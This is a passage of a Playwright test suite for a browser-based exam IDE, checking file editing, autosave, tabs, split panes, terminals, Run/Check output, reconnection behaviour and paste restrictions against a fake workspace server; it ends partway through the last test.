import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

// The student's IDE for a workspace exam, against the in-memory stand-in for the container (tests/fake-workspace-server.js) and the
// application's Go side (tests/fake-api.js).
const project = {
  'Makefile': 'all:\n\techo build\n',
  'src/list.cpp': '#include "list.hpp"\n\nvoid push_front() {}\n',
  'src/main.cpp': 'int main() { return 0; }\n',
  'tests/sample_test.cpp': 'int main() {}\n',
  'notes.txt': 'first line\nsecond line\n',
};

async function start(page, options = {}, viewport = { width: 1280, height: 800 }) {
  await page.setViewportSize(viewport);
  const errors = [];
  page.on('pageerror', error => errors.push(error.message));
  await page.addInitScript(() => {
    window.__storage = [];
    for (const method of ['setItem', 'removeItem', 'clear']) {
      const original = Storage.prototype[method];
      Storage.prototype[method] = function (...args) { window.__storage.push(method); return original.apply(this, args); };
    }
  });
  await page.goto('/');
  // Unless a test is about them, the exam has no instructions, whose tab would put the first file opened in a second pane.
  await page.evaluate(value => window.__studentHarness.useWorkspace(value), { files: project, instructions: '', ...options });
  await page.getByLabel('I have read these rules').check();
  await page.getByLabel('Account number').fill('00123');
  await page.getByLabel('Exam PIN').fill('synthetic PIN');
  await page.getByRole('button', { name: 'Login / resume' }).click();
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  await expect(page.getByRole('treeitem', { name: 'Makefile' })).toBeVisible();
  return errors;
}
const server = (page, expression, arg) => page.evaluate(([code, value]) => new Function('server', 'value', `return ${code}`)(window.__studentHarness.workspaceServer, value), [expression, arg]);
const file = (page, path) => server(page, 'server.files.get(value)', path);
const openFile = async (page, name) => {
  await page.getByRole('treeitem', { name, exact: true }).click();
  return page.getByRole('textbox', { name: new RegExp(`^Editor for .*${name.replace('.', '\\.')}$`) });
};
// The terminals take no room until one is wanted: the Terminal button (next to Run and Check) shows the panel, with a terminal in it.
const terminalButton = page => page.getByRole('button', { name: /^Terminal( \(\d\))?$/ });
const openTerminal = page => terminalButton(page).click();
async function openSrc(page) {
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  return openFile(page, 'list.cpp');
}

const examText = '<p>Build the program and make <code>make check</code> pass.</p>';

test('the workspace shows the exam text, the files and the status, and none of the question-exam page', async ({ page }) => {
  const errors = await start(page, { instructions: examText });
  await expect(page.getByRole('region', { name: 'Instructions', exact: true })).toContainText('make check');
  await expect(page.getByRole('checkbox', { name: /Implement push_front/ })).toBeVisible();
  await expect(page.getByRole('checkbox', { name: /Add a test of your own/ })).toBeVisible();
  // The connection and the saves are told in the toolbar, with the time, and there is no bar of them below the editor.
  await expect(page.locator('header.toolbar').getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
  await expect(page.locator('header.toolbar').getByLabel('Remaining time')).toBeVisible();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toHaveCount(1);
  await expect(page.getByText(/Time left/)).toHaveCount(0);
  await expect(page.getByRole('button', { name: 'Save', exact: true })).toBeVisible();
  await expect(page.getByRole('button', { name: /Submit current answers/ })).toHaveCount(0);
  await expect(page.getByRole('button', { name: 'Finish exam…' })).toBeVisible();
  await expect(page.getByRole('navigation', { name: 'Exercises' })).toHaveCount(0);
  await expect(page.getByLabel('Save status')).toHaveCount(0);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth && document.documentElement.scrollHeight <= innerHeight + 2)).toBe(true);
  expect(errors).toEqual([]);
});

test('a file is opened from the tree, edited, and saved after a second of idle', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await expect(editor).toContainText('push_front');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('// added by the student\n');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).toContainText('●');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Unsaved changes');
  expect(await file(page, 'src/list.cpp')).not.toContain('added by the student');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 3000 }).toContain('// added by the student');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).not.toContainText('●');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText(/Saved \d/);
});

test('Ctrl+S saves at once, and switching tabs saves the file left behind', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// one\n');
  await page.keyboard.press('Control+s');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 400 }).toContain('// one');
  await page.keyboard.type('// two\n');
  await openFile(page, 'notes.txt');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 600 }).toContain('// two');
  // Back again: the tab kept its text and the cursor's place.
  await page.getByRole('tab', { name: /list\.cpp/ }).click();
  await expect(page.getByRole('textbox', { name: /Editor for src\/list\.cpp/ })).toContainText('// two');
});

const openTabs = page => page.getByRole('tablist', { name: 'Open files' }).getByRole('tab');

test('Ctrl+W closes the file in front, saving it first, from the editor or the tree, and one file for a key held down', async ({ page }) => {
  await start(page);
  await openFile(page, 'Makefile');
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('closed with Ctrl+W\n');
  await page.keyboard.press('Control+w');
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toHaveCount(0);
  await expect.poll(() => file(page, 'notes.txt')).toContain('closed with Ctrl+W');
  // The file behind it comes to the front, with the keyboard in it.
  await expect(page.getByRole('tab', { name: /Makefile/ })).toHaveAttribute('aria-selected', 'true');
  await expect(page.getByRole('textbox', { name: /Editor for Makefile/ })).toBeFocused();
  // From the file tree too; a key held down (its repeats) closes one file, not every file.
  await openFile(page, 'notes.txt');
  await page.getByRole('treeitem', { name: 'notes.txt', exact: true }).focus();
  await page.keyboard.down('Control');
  for (let i = 0; i < 3; i += 1) await page.keyboard.down('w');
  await page.keyboard.up('w');
  await page.keyboard.up('Control');
  await expect(openTabs(page)).toHaveCount(1);
  await expect(page.getByRole('tab', { name: /Makefile/ })).toBeVisible();
  // Not behind a dialog: the dialog is what the student is looking at.
  await page.getByRole('button', { name: 'File', exact: true }).click();
  await expect(page.getByRole('dialog', { name: 'New file' })).toBeVisible();
  await page.keyboard.press('Control+w');
  await page.keyboard.press('Escape');
  await expect(openTabs(page)).toHaveCount(1);
});

test('in a terminal Ctrl+W is the program\'s, and the student is told once how to close a file', async ({ page }) => {
  await start(page);
  await openFile(page, 'notes.txt');
  await openTerminal(page);
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.type('echo one two');
  await page.keyboard.press('Control+w');
  await page.keyboard.press('Control+w');
  // bash deletes a word with it (^W), and nano searches: the terminal has both, and the file is still open.
  await expect.poll(async () => (await server(page, 'server.typed.join("")')).split('\x17').length - 1).toBe(2);
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toBeVisible();
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
  await expect(page.getByRole('status').filter({ hasText: 'In a terminal, Ctrl+W belongs to the program' })).toHaveCount(1);
});

test('a middle click closes a tab, and the ⋯ menu closes all of them, the others, or the saved ones', async ({ page }) => {
  await start(page);
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  for (const name of ['list.cpp', 'main.cpp', 'Makefile', 'notes.txt']) await openFile(page, name);
  await expect(openTabs(page)).toHaveCount(4);
  await page.getByRole('tab', { name: /main\.cpp/ }).click({ button: 'middle' });
  await expect(openTabs(page)).toHaveCount(3);
  await expect(page.getByRole('tab', { name: /main\.cpp/ })).toHaveCount(0);
  // An unsaved file (the disk is full) is not a saved one: Close saved leaves it.
  await server(page, 'server.diskFull = true');
  await page.getByRole('textbox', { name: /Editor for notes\.txt/ }).click();
  await page.keyboard.type('not saved\n');
  await expect(page.getByRole('img', { name: 'unsaved changes' })).toBeVisible();
  const actions = page.getByRole('button', { name: 'Tab actions' });
  await actions.click();
  const menu = page.getByRole('menu', { name: 'Tab actions' });
  await expect(menu.getByRole('menuitem')).toHaveText([/^Close all\s*3$/, /^Close others\s*2$/, /^Close saved\s*2$/, /^Move notes\.txt to the right$/, /^Close notes\.txt\s*Ctrl\+W$/]);
  await menu.getByRole('menuitem', { name: 'Close saved' }).click();
  await expect(menu).toHaveCount(0);
  await expect(openTabs(page)).toHaveText([/notes\.txt/]);
  // Close all: the file that cannot be saved stays open, with its changes, and the student is told.
  await actions.click();
  await expect(menu.getByRole('menuitem', { name: 'Close others' })).toBeDisabled();
  await menu.getByRole('menuitem', { name: 'Close all' }).click();
  await expect(page.getByRole('alert').filter({ hasText: 'notes.txt has changes that could not be saved yet, so it stays open.' })).toBeVisible();
  await expect(openTabs(page)).toHaveText([/notes\.txt/]);
  await server(page, 'server.diskFull = false');
  await actions.click();
  await menu.getByRole('menuitem', { name: 'Close all' }).click();
  await expect(openTabs(page)).toHaveCount(0);
  await expect.poll(() => file(page, 'notes.txt')).toContain('not saved');
  await expect(actions).toBeDisabled();
});

test('the ⋯ menu works from the keyboard: the arrows open and move, Enter acts, Escape goes back to the button', async ({ page }) => {
  await start(page);
  await openFile(page, 'Makefile');
  await openFile(page, 'notes.txt');
  const actions = page.getByRole('button', { name: 'Tab actions' });
  await actions.focus();
  await page.keyboard.press('ArrowDown');
  const menu = page.getByRole('menu', { name: 'Tab actions' });
  await expect(actions).toHaveAttribute('aria-expanded', 'true');
  await expect(menu.getByRole('menuitem', { name: 'Close all' })).toBeFocused();
  await page.keyboard.press('ArrowUp');
  await expect(menu.getByRole('menuitem', { name: 'Close notes.txt' })).toBeFocused();
  await page.keyboard.press('Escape');
  await expect(menu).toHaveCount(0);
  await expect(actions).toBeFocused();
  await expect(actions).toHaveAttribute('aria-expanded', 'false');
  await page.keyboard.press('Enter');
  await page.keyboard.press('ArrowDown');
  await expect(menu.getByRole('menuitem', { name: 'Close others' })).toBeFocused();
  await page.keyboard.press('Enter');
  await expect(openTabs(page)).toHaveText([/notes\.txt/]);
  await expect(actions).toBeFocused();
  // A click elsewhere closes it.
  await actions.click();
  await expect(menu).toBeVisible();
  await page.getByRole('textbox', { name: /Editor for notes\.txt/ }).click();
  await expect(menu).toHaveCount(0);
  await expect(openTabs(page)).toHaveText([/notes\.txt/]);
});

const pane = (page, side) => page.getByRole('region', { name: `Editor (${side})` });

test('Alt+click or Ctrl+Enter opens a file on the other side, the next file goes to the pane last used, and the tree says where each file is', async ({ page }) => {
  await start(page);
  await openFile(page, 'notes.txt');
  await expect(page.getByRole('region', { name: 'Editor', exact: true })).toBeVisible();
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click({ modifiers: ['Alt'] });
  await expect(pane(page, 'left').getByRole('tab')).toHaveText([/notes\.txt/]);
  await expect(pane(page, 'right').getByRole('tab')).toHaveText([/Makefile/]);
  await expect(page.getByRole('textbox', { name: 'Editor for Makefile' })).toBeFocused();
  // The tree marks which pane each open file is in.
  const row = name => page.getByRole('treeitem', { name, exact: true });
  await expect(row('notes.txt').locator('.where')).toHaveText('L');
  await expect(row('Makefile').locator('.where')).toHaveText('R');
  // The right pane was used last: the next file goes there, after the tab in front.
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  await openFile(page, 'list.cpp');
  await expect(pane(page, 'right').getByRole('tab')).toHaveText([/Makefile/, /list\.cpp/]);
  // Working in the left pane makes it the one last used, and Ctrl+Enter in the tree opens on the other side of it, the right.
  await page.getByRole('textbox', { name: 'Editor for notes.txt' }).click();
  await server(page, 'server.diskFull = true');
  await page.keyboard.type('x');
  await expect(row('notes.txt').locator('.unsaved')).toBeVisible();
  await row('main.cpp').focus();
  await page.keyboard.press('Control+Enter');
  await expect(pane(page, 'right').getByRole('tab')).toHaveText([/Makefile/, /list\.cpp/, /main\.cpp/]);
  // Enter opens it where it is, and Alt+click on a file that is open moves it to the other side.
  await row('Makefile').click({ modifiers: ['Alt'] });
  await expect(pane(page, 'left').getByRole('tab')).toHaveText([/notes\.txt/, /Makefile/]);
  await expect(row('Makefile').locator('.where')).toHaveText('L');
});

test('a tab moved to the other pane keeps its unsaved text, its undo history, its cursor and its scroll, and a pane left with nothing goes', async ({ page }) => {
  await start(page, { files: { ...project, 'big.txt': bigFile } }, { width: 1366, height: 768 });
  await openFile(page, 'notes.txt');
  const editor = await openFile(page, 'big.txt');
  await editor.click();
  await page.keyboard.press('Control+Home');
  for (let i = 0; i < 120; i += 1) await page.keyboard.press('ArrowDown');
  await server(page, 'server.diskFull = true');
  await page.keyboard.type('typed before the move');
  const where = () => page.evaluate(() => {
    const view = document.querySelector('[aria-label="Editor for big.txt"]').closest('.cm-editor');
    return { line: Number(view.querySelector('.cm-activeLineGutter')?.textContent), scroll: Math.round(view.querySelector('.cm-scroller').scrollTop) };
  });
  const before = await where();
  expect(before.scroll).toBeGreaterThan(1000);
  await page.getByRole('button', { name: 'Move to the other side', exact: true }).click();
  await expect(pane(page, 'right').getByRole('tab')).toHaveText([/big\.txt/]);
  await expect(pane(page, 'left').getByRole('tab')).toHaveText([/notes\.txt/]);
  const moved = page.getByRole('textbox', { name: 'Editor for big.txt' });
  await expect(moved).toBeFocused();
  await expect(moved).toContainText('typed before the move');
  await expect(pane(page, 'right').getByRole('img', { name: 'unsaved changes' })).toBeVisible();
  await expect.poll(where).toEqual(before);
  // What is written is what the editor shows, once the disk has room again.
  await server(page, 'server.diskFull = false');
  await page.keyboard.press('Control+s');
  await expect.poll(() => file(page, 'big.txt')).toContain('typed before the move');
  // The undo history came along: Ctrl+Z takes the typing back.
  for (let i = 0; i < 3; i += 1) await page.keyboard.press('Control+z');
  await expect(moved).not.toContainText('typed before');
  await expect.poll(() => file(page, 'big.txt')).toBe(bigFile);
  // Moved back, the right pane is left with nothing and goes; the tab is where it was again.
  const back = await where();
  await page.getByRole('button', { name: 'Move to the other side (right)' }).click();
  await expect(page.getByRole('region', { name: 'Editor', exact: true }).getByRole('tab')).toHaveText([/notes\.txt/, /big\.txt/]);
  await expect(page.getByRole('separator', { name: 'Resize the two panes of the editor' })).toHaveCount(0);
  await expect.poll(where).toEqual(back);
});

test('a file in the right pane is reloaded when it changes in the terminal, and asks when it has edits', async ({ page }) => {
  await start(page);
  await openFile(page, 'Makefile');
  await page.getByRole('treeitem', { name: 'notes.txt', exact: true }).click({ modifiers: ['Alt'] });
  const editor = page.getByRole('textbox', { name: 'Editor for notes.txt' });
  await expect(editor).toBeVisible();
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten in the terminal\n'));
  await expect(editor).toContainText('rewritten in the terminal');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('my own line');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten again\n'));
  const prompt = pane(page, 'right').getByRole('alert').filter({ hasText: 'This file changed in the terminal' });
  await expect(prompt).toBeVisible();
  await prompt.getByRole('button', { name: 'Keep yours' }).click();
  await expect.poll(() => file(page, 'notes.txt')).toContain('my own line');
  await expect(page.getByRole('textbox', { name: 'Editor for Makefile' })).toContainText('all:');
});

test('Ctrl+1 and Ctrl+2 go to the panes, Ctrl+Page Down and Up go round the tabs, F6 stops at both panes, and a terminal keeps those keys', async ({ page }) => {
  await start(page);
  await openFile(page, 'notes.txt');
  await openFile(page, 'Makefile');
  // With one pane, Ctrl+2 says how to make the second.
  await page.keyboard.press('Control+2');
  await expect(page.getByRole('status').filter({ hasText: 'There is one pane' })).toBeVisible();
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  await page.getByRole('treeitem', { name: 'list.cpp', exact: true }).click({ modifiers: ['Alt'] });
  await expect(page.getByRole('textbox', { name: 'Editor for src/list.cpp' })).toBeFocused();
  await page.keyboard.press('Control+1');
  await expect(page.getByRole('textbox', { name: 'Editor for Makefile' })).toBeFocused();
  await page.keyboard.press('Control+PageDown');
  await expect(page.getByRole('textbox', { name: 'Editor for notes.txt' })).toBeFocused();
  await page.keyboard.press('Control+PageUp');
  await expect(page.getByRole('textbox', { name: 'Editor for Makefile' })).toBeFocused();
  await page.keyboard.press('Control+2');
  await expect(page.getByRole('textbox', { name: 'Editor for src/list.cpp' })).toBeFocused();
  // F6 goes round the panes that are there; both editor panes are stops.
  await page.keyboard.press('Shift+F6');
  await expect(page.getByRole('textbox', { name: 'Editor for Makefile' })).toBeFocused();
  await page.keyboard.press('F6');
  await expect(page.getByRole('textbox', { name: 'Editor for src/list.cpp' })).toBeFocused();
  // In a terminal those keys are the program's.
  await openTerminal(page);
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.press('Control+1');
  await page.keyboard.press('Control+PageDown');
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
  await expect(pane(page, 'left').getByRole('tab', { selected: true })).toHaveText(/Makefile/);
});

test('a splitter shares the width between the two panes, with the pointer and the keys, and closing the last tab of a pane closes it', async ({ page }) => {
  await start(page, {}, { width: 1366, height: 768 });
  await openFile(page, 'notes.txt');
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click({ modifiers: ['Alt'] });
  const splitter = page.getByRole('separator', { name: 'Resize the two panes of the editor' });
  await expect(splitter).toHaveAttribute('aria-valuenow', '50');
  const width = side => pane(page, side).boundingBox().then(box => box.width);
  const half = await width('left');
  await splitter.focus();
  await page.keyboard.press('ArrowRight');
  await expect(splitter).toHaveAttribute('aria-valuenow', '55');
  await page.keyboard.press('Home');
  await expect(splitter).toHaveAttribute('aria-valuenow', '80');
  await expect.poll(() => width('left')).toBeGreaterThan(half * 1.4);
  await page.keyboard.press('Enter');
  await expect(splitter).toHaveAttribute('aria-valuenow', '50');
  const box = await splitter.boundingBox();
  await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  await page.mouse.down();
  await page.mouse.move(box.x - 150, box.y + box.height / 2, { steps: 5 });
  await page.mouse.up();
  await expect.poll(async () => Number(await splitter.getAttribute('aria-valuenow'))).toBeLessThan(40);
  // Closing the last tab of the right pane closes the pane: the left one has all the width again.
  await page.getByRole('button', { name: 'Close Makefile' }).click();
  await expect(splitter).toHaveCount(0);
  await expect(page.getByRole('region', { name: 'Editor', exact: true })).toBeVisible();
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
});

test('the terminals are dark: the navy ground of the theme and sidebar text, in xterm and around it, and no critical accessibility problem', async ({ page }) => {
  await start(page);
  await openFile(page, 'notes.txt');
  await openTerminal(page);
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Run output' })).toBeVisible();
  const token = name => page.evaluate(value => { const probe = document.createElement('i'); probe.style.color = `var(${value})`; document.body.append(probe); const color = getComputedStyle(probe).color; probe.remove(); return color; }, name);
  const ground = await token('--term-ground');
  expect(ground).toBe('rgb(10, 35, 66)'); // the navy of the text
  const background = selector => page.locator(selector).first().evaluate(element => getComputedStyle(element).backgroundColor);
  expect(await background('.terminal-box .xterm-viewport')).toBe(ground);
  expect(await background('.terminal-box .terminal')).toBe(ground);
  // The tab in front is light on the ground; the others dim on the deeper tab row.
  const front = page.getByRole('tab', { name: /^Run/ });
  expect(await front.evaluate(element => getComputedStyle(element).backgroundColor)).toBe(ground);
  expect(await front.evaluate(element => getComputedStyle(element).color)).toBe(await token('--on-dark'));
  const result = await new AxeBuilder({ page }).include('#terminal-panel').analyze();
  const serious = result.violations.filter(violation => ['critical', 'serious'].includes(violation.impact));
  expect(serious.map(v => `${v.impact} ${v.id}: ${v.nodes.map(n => n.target.join(' ')).join(' | ')}`)).toEqual([]);
});

test('Run and Check show their output in terminals of their own, after saving the files', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// edited before running\n');
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  const run = page.getByRole('region', { name: 'Run output' });
  await expect(run).toContainText('list: 3 2 1');
  expect(await file(page, 'src/list.cpp')).toContain('edited before running');
  await expect(page.getByRole('tab', { name: /Run/ })).toContainText('✓');
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Check output' })).toContainText('FAILED push_front');
  await expect(page.getByRole('tab', { name: /Check/ })).toContainText('✗');
  await expect(page.getByRole('status').filter({ hasText: 'Check ended with code 1' })).toBeVisible();
  // Make it pass, and check again: the new Check takes the place of the old one.
  await editor.click();
  await page.keyboard.type('// DONE\n');
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Check output' })).toContainText('3 of 3 passed');
  await expect(page.getByRole('tab', { name: /Check/ })).toHaveCount(1);
});

test('a terminal takes keystrokes, and what it does to the files shows in the tree within a second', async ({ page }) => {
  await start(page);
  await openTerminal(page);
  const terminal = page.getByRole('region', { name: 'Terminal 1 output' });
  await expect(terminal).toContainText('student@workspace');
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.type('touch made_by_terminal.txt');
  await page.keyboard.press('Enter');
  await expect(page.getByRole('treeitem', { name: 'made_by_terminal.txt' })).toBeVisible({ timeout: 1000 });
  await page.keyboard.type('rm notes.txt');
  await page.keyboard.press('Enter');
  await expect(page.getByRole('treeitem', { name: 'notes.txt' })).toHaveCount(0, { timeout: 1000 });
  // Ctrl+C and Ctrl+D go to the program, not to the application.
  await page.keyboard.press('Control+c');
  await page.keyboard.press('Control+d');
  const typed = await server(page, 'server.typed');
  expect(typed.join('')).toContain('\x03');
  expect(typed.join('')).toContain('\x04');
});

test('at most four terminals, each closable', async ({ page }) => {
  await start(page);
  await openTerminal(page);
  const add = page.getByRole('button', { name: 'New terminal' });
  for (let i = 0; i < 3; i += 1) await add.click();
  await expect(page.getByRole('tab', { name: /Terminal \d/ })).toHaveCount(4);
  await expect(add).toBeDisabled();
  await page.getByRole('tab', { name: /Terminal 2/ }).click();
  await page.getByRole('button', { name: 'Close Terminal 2' }).click();
  await expect(page.getByRole('tab', { name: /Terminal \d/ })).toHaveCount(3);
  await expect(add).toBeEnabled();
});

test('files and folders are made, renamed and deleted, with a confirmation for the delete', async ({ page }) => {
  await start(page);
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  await page.getByRole('button', { name: 'File', exact: true }).click();
  const dialog = page.getByRole('dialog', { name: 'New file' });
  await expect(dialog).toContainText('src');
  await dialog.getByLabel('Name').fill('a/b');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog.getByRole('alert')).toContainText('one at a time');
  await dialog.getByLabel('Name').fill('main.cpp');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog.getByRole('alert')).toContainText('already exists');
  await dialog.getByLabel('Name').fill('util.cpp');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog).toHaveCount(0);
  await expect(page.getByRole('tab', { name: /util\.cpp/ })).toHaveAttribute('aria-selected', 'true');
  expect(await file(page, 'src/util.cpp')).toBe('');
  // A folder at the top, then a rename of the file.
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click();
  await page.getByRole('button', { name: 'Folder', exact: true }).click();
  await page.getByRole('dialog', { name: 'New folder' }).getByLabel('Name').fill('docs');
  await page.getByRole('dialog', { name: 'New folder' }).getByRole('button', { name: 'Create' }).click();
  await expect(page.getByRole('treeitem', { name: 'docs', exact: true })).toBeVisible();
  await page.getByRole('treeitem', { name: 'util.cpp', exact: true }).click();
  await page.getByRole('button', { name: 'Rename', exact: true }).click();
  const rename = page.getByRole('dialog', { name: 'Rename util.cpp' });
  await rename.getByLabel('New name').fill('helpers.cpp');
  await rename.getByRole('button', { name: 'Rename' }).click();
  await expect(page.getByRole('treeitem', { name: 'helpers.cpp' })).toBeVisible();
  await expect(page.getByRole('tab', { name: /helpers\.cpp/ })).toBeVisible();
  // Delete asks first, and says what goes.
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  const confirm = page.getByRole('dialog', { name: 'Delete helpers.cpp?' });
  await expect(confirm).toContainText('This cannot be undone');
  await confirm.getByRole('button', { name: 'Keep it' }).click();
  expect(await file(page, 'src/helpers.cpp')).toBe('');
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  await page.getByRole('dialog', { name: 'Delete helpers.cpp?' }).getByRole('button', { name: 'Delete', exact: true }).click();
  await expect(page.getByRole('treeitem', { name: 'helpers.cpp' })).toHaveCount(0);
  await expect(page.getByRole('tab', { name: /helpers\.cpp/ })).toHaveCount(0);
  expect(await file(page, 'src/helpers.cpp')).toBeUndefined();
});

test('a file changed in the terminal is reloaded if untouched, and asks if the student has edits', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten in the terminal\n'));
  await expect(editor).toContainText('rewritten in the terminal');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('my own line');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten again\n'));
  const prompt = page.getByRole('alert').filter({ hasText: 'This file changed in the terminal' });
  await expect(prompt).toBeVisible();
  await page.waitForTimeout(1300);
  expect(await file(page, 'notes.txt')).toBe('rewritten again\n');
  await prompt.getByRole('button', { name: 'Keep yours' }).click();
  await expect.poll(() => file(page, 'notes.txt')).toContain('my own line');
  await expect(prompt).toHaveCount(0);
  // And the other answer.
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs\n'));
  await expect(editor).toContainText('theirs');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type(' more');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs again\n'));
  await prompt.getByRole('button', { name: 'Reload' }).click();
  await expect(editor).toContainText('theirs again');
  await expect(prompt).toHaveCount(0);
});

test('a TODO tick is kept by the server', async ({ page }) => {
  await start(page);
  const box = page.getByRole('checkbox', { name: /Implement push_front/ });
  await box.check();
  await expect.poll(() => server(page, 'server.todo.t1')).toBe(true);
  await expect(page.getByRole('group', { name: '' }).first()).toBeDefined();
  await expect(page.getByText('1/2')).toBeVisible();
  await box.uncheck();
  await expect.poll(() => server(page, 'server.todo.t1')).toBe(false);
});

test('Save takes a snapshot of what is saved, and says so', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('final answer ');
  await page.getByRole('button', { name: 'Save', exact: true }).click();
  await expect(page.getByText(/^Last Save \d/)).toBeVisible();
  expect(await server(page, "server.submits.at(-1).get('notes.txt')")).toContain('final answer');
  await expect(page.getByText('Your work was saved')).toBeVisible();
  // It is a save, not the end of the exam: the exam's own Submit is not called.
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  await expect(page.getByRole('button', { name: 'Finish exam…' })).toBeEnabled();
});

test('while the connection is down the editor and terminals are read-only, and what was typed is saved after it returns', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('typed before the drop');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await expect(page.getByText(/Reconnecting…/).first()).toBeVisible();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Reconnecting');
  await expect(page.getByRole('button', { name: 'Run', exact: true })).toBeDisabled();
  await expect(page.getByRole('button', { name: 'Save', exact: true })).toBeDisabled();
  await expect(editor).toHaveAttribute('aria-readonly', 'true');
  await page.keyboard.type('NOT TYPED');
  await expect(editor).not.toContainText('NOT TYPED');
  await page.waitForTimeout(1500);
  expect(await file(page, 'notes.txt')).not.toContain('typed before the drop');
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toContainText('●');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await expect.poll(() => file(page, 'notes.txt')).toContain('typed before the drop');
  await expect(editor).not.toHaveAttribute('aria-readonly', 'true');
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).not.toContainText('●');
});

test('pulling the network for 30 seconds loses no edits', async ({ page }) => {
  await page.clock.install();
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('before ');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await page.clock.runFor(10000);
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await page.clock.runFor(30000);
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toContainText('●');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await page.clock.runFor(2000);
  expect(await file(page, 'notes.txt')).toContain('before ');
});

test('the end of the connection says why when it will not come back by itself', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.workspaceConnection('replaced', 'This exam is open in another window, which took the workspace over.'));
  await expect(page.getByText('open in another window').first()).toBeVisible();
  await page.getByRole('button', { name: 'Use this window' }).click();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
});

test('pastes from outside are stopped in the editor and the terminal, and pastes of what was copied inside go through', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  const paste = (selector, text) => page.evaluate(([css, value]) => {
    const target = document.querySelector(css);
    const data = new DataTransfer(); data.setData('text/plain', value);
    const event = new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true });
    target.dispatchEvent(event);
    return event.defaultPrevented;
  }, [selector, text]);
  const copy = text => page.evaluate(value => {
    const data = new DataTransfer(); data.setData('text/plain', value);
    document.dispatchEvent(new ClipboardEvent('copy', { clipboardData: data, bubbles: true }));
  }, text);
  await editor.click();
  expect(await paste('.cm-content', 'from a web page')).toBe(true);
  await expect(editor).not.toContainText('from a web page');
  // The server is told where it was aimed and how big it was, never what it said.
